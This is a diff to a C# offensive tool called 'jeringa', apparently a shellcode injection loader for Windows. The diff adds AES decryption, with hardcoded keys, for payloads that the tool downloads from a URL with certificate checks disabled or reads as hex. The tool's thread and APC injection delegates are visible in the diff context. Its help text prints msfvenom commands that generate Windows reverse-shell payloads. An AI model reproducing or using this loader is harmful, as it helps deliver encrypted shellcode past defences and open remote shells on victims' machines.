@@ -15,6 +15,8 @@ namespace jeringa
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         static String password = "ricardojoserf   ";
         static String iv = "jeringa jeringa ";
+        static String payload_aes_password = "ricardojoserf123ricardojoserf123";
+        static String payload_aes_iv = "jeringa1jeringa1";
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
         [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
@@ -31,36 +33,6 @@ namespace jeringa
         delegate uint QueueUserAPCDelegate(IntPtr pfnAPC, IntPtr hThread, uint dwData);
         delegate uint ResumeThreadDelegate(IntPtr hThread);
         delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
-
-
-        static String EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
-        {
-            if (plainText == null || plainText.Length <= 0)
-                throw new ArgumentNullException("plainText");
-            if (Key == null || Key.Length <= 0)
-                throw new ArgumentNullException("Key");
-            if (IV == null || IV.Length <= 0)
-                throw new ArgumentNullException("IV");
-            byte[] encrypted;
-            using (RijndaelManaged rijAlg = new RijndaelManaged())
-            {
-                rijAlg.Key = Key;
-                rijAlg.IV = IV;
-                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
-                using (MemoryStream msEncrypt = new MemoryStream())
-                {
-                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
-                    {
-                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
-                        {
-                            swEncrypt.Write(plainText);
-                        }
-                        encrypted = msEncrypt.ToArray();
-                    }
-                }
-            }
-            return Convert.ToBase64String(encrypted);
-        }
 
 
         static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
@@ -171,6 +143,42 @@ namespace jeringa
         }
 
 
+        static byte[] tryToDecryptString(String payload_str)
+        {
+            try
+            {
+                String decryptedPayload = DecryptStringFromBytes(payload_str, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
+                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
+                Console.WriteLine("[+] It was possible to decrypt the payload.");
+                // Console.WriteLine("\nRaw:    " + Encoding.UTF8.GetString(decryptedBytes));
+                // Console.WriteLine("\nBase64: " + Convert.ToBase64String(decryptedBytes));
+                return decryptedBytes;
+            }
+            catch
+            {
+                // Console.WriteLine("[-] It was not possible to decrypt the payload - Probably not using AES encryption.");
+                return ToByteArray(payload_str);
+            }
+        }
+
+        static byte[] tryToDecryptFile(byte[] encryptedBytes)
+        {
+            try
+            {
+                String encryptedPayload = Convert.ToBase64String(encryptedBytes);
+                String decryptedPayload = DecryptStringFromBytes(encryptedPayload, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
+                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
+                Console.WriteLine("[+] It was possible to decrypt the payload.");
+                return decryptedBytes;
+            }
+            catch
+            {
+                // Console.WriteLine("[-] It was not possible to decrypt the file - Probably not using AES encryption.");
+                return encryptedBytes;
+
+            }
+        }
+
         static byte[] getPayload(String payload_str)
         {
             // Payload from standard input
@@ -201,7 +209,7 @@ namespace jeringa
                     {
                         System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                         buf = myWebClient.DownloadData(payload_str);
-
+                        buf = tryToDecryptFile(buf);
                     }
                     catch (Exception ex)
                     {
@@ -214,7 +222,7 @@ namespace jeringa
             // Hexadecimal payload
             else
             {
-                buf = ToByteArray(payload_str);
+                buf = tryToDecryptString(payload_str);
             }
 
             return buf;
@@ -406,10 +414,10 @@ namespace jeringa
             Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
             Console.WriteLine("[+] Payload generation\n");
-            Console.WriteLine("[*] Create payload in HEX format using Msfvenom with:");
-            Console.WriteLine("Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'");
-            Console.WriteLine("[*] Create payload in raw format for url option using Msfvenom with:");
-            Console.WriteLine("Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin");
+            Console.WriteLine("[*] Example - Create payload in HEX format using Msfvenom with:");
+            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'");
+            Console.WriteLine("[*] Example - Create payload in raw format for url option using Msfvenom with:");
+            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin");
 
             System.Environment.Exit(0);
         }
